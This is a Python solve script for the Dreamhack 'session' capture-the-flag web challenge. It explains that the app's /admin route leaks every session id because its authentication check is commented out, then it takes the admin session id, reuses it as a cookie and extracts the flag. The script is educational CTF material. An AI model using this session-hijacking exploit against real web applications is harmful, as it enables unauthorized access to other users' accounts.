#!/usr/bin/python3
"""
Exploit for the Dreamhack "session" web challenge (app.py).

Vulnerability
-------------
The /admin route (app.py) is supposed to check that the requester is the
admin, but the authentication block is commented out and the handler simply
returns the entire `session_storage` dict:

    @app.route('/admin')
    def admin():
        #session_id = request.cookies.get('sessionid', None)
        #username = session_storage[session_id]
        #if username != 'admin':
        #    return render_template('index.html')
        return session_storage

Since the admin session id is generated at startup and stored in
`session_storage`, hitting /admin leaks the admin's session id directly. No
brute force is required. We take that session id, set it as our `sessionid`
cookie, request /, and the index handler prints the flag because our session
now maps to the "admin" username.

Usage
-----
    python3 solve.py http://host:port
    python3 solve.py https://<challenge-instance>.dreamhack.games
"""
import re
import sys
import json


def parse_session_storage(text):
    """Parse the /admin response into a {session_id: username} mapping.

    Flask auto-jsonifies a returned dict, so the body is normally JSON. We
    fall back to a regex over Python-repr output ({'sid': 'admin'}) just in
    case the target renders it differently.
    """
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        pass
    # Fallback: pull "key": "value" or 'key': 'value' pairs out of the text.
    pairs = re.findall(r"['\"]([0-9a-fA-F]+)['\"]\s*:\s*['\"]([^'\"]+)['\"]", text)
    return dict(pairs)


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base_url>", file=sys.stderr)
        sys.exit(1)

    import requests

    base = sys.argv[1].rstrip('/')

    # 1) Leak the whole session storage via the broken /admin route.
    admin_resp = requests.get(f"{base}/admin", timeout=15)
    storage = parse_session_storage(admin_resp.text)
    print(f"[*] /admin leaked {len(storage)} session(s)")

    # 2) Find the session id whose username is "admin".
    admin_sid = next((sid for sid, user in storage.items() if user == 'admin'), None)
    if not admin_sid:
        print("[-] no admin session found in /admin output:", admin_resp.text[:200],
              file=sys.stderr)
        sys.exit(1)
    print(f"[+] admin sessionid = {admin_sid}")

    # 3) Impersonate admin by presenting that session id as our cookie.
    index_resp = requests.get(base + '/', cookies={'sessionid': admin_sid}, timeout=15)

    m = re.search(r'DH\{[^}]+\}', index_resp.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
    else:
        # Print the greeting line so the flag is visible even if the format differs.
        text = re.search(r'Hello admin[^<]*', index_resp.text)
        print("[*] index response:", (text.group(0) if text else index_resp.text[:300]))


if __name__ == '__main__':
    main()
